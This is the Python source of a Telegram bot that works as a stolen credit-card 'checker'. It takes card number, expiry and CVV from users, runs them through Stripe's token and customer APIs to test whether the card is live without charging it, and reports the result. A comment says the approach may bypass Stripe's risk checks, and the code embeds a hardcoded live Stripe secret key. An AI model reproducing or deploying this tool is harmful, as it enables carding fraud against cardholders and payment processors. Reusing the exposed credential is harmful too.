import os
import telebot
import requests
import stripe
from flask import Flask
from threading import Thread

app = Flask('')
@app.route('/')
def home(): return "Bot is alive!"

def run():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))

def keep_alive():
    Thread(target=run).start()

TOKEN = os.getenv("TOKEN")
bot = telebot.TeleBot(TOKEN, parse_mode="HTML")
stripe.api_key = "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"

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "<b>👋 Welcome Janu!</b>\n\n🔍 /bin 123456\n💳 /chk card|mm|yy|cvv", parse_mode="HTML")

@bot.message_handler(commands=['chk'])
def chk_handler(message):
    input_data = message.text.replace('/chk', '').strip()
    if "|" not in input_data:
        return bot.reply_to(message, "❌ Format: <code>card|mm|yy|cvv</code>")

    try:
        cc, mm, yy, cvv = input_data.split('|')
        if len(yy) == 2: yy = "20" + yy
        
        bot.send_chat_action(message.chat.id, 'typing')

        # Pehle Card ka Token banao (Is se 'Unsafe' error bypass ho sakta hai)
        token = stripe.Token.create(
            card={"number": cc, "exp_month": int(mm), "exp_year": int(yy), "cvc": cvv},
        )
        
        # Agar token ban gaya, to card ko check karne ke liye Customer banao (Actual Charge nahi hoga)
        customer = stripe.Customer.create(source=token.id)
        
        res = "✅ <b>CARD LIVE (CVV MATCH)</b>"
        reason = "Card successfully validated via Token."

    except stripe.error.CardError as e:
        res = "❌ <b>DECLINED</b>"
        reason = e.user_message
    except Exception as e:
        res = "❌ <b>STRIPE ERROR</b>"
        reason = str(e).split(':')[0] # Short error message

    final_msg = f"━━━━━━━━━━━━━━━━━━\n{res}\n━━━━━━━━━━━━━━━━━━\n\n💳 <b>Card:</b> <code>{input_data}</code>\n📝 <b>Response:</b> {reason}\n⚡ <b>Gateway:</b> Stripe Token\n━━━━━━━━━━━━━━━━━━"
    bot.reply_to(message, final_msg)

if __name__ == "__main__":
    keep_alive()
    bot.infinity_polling()
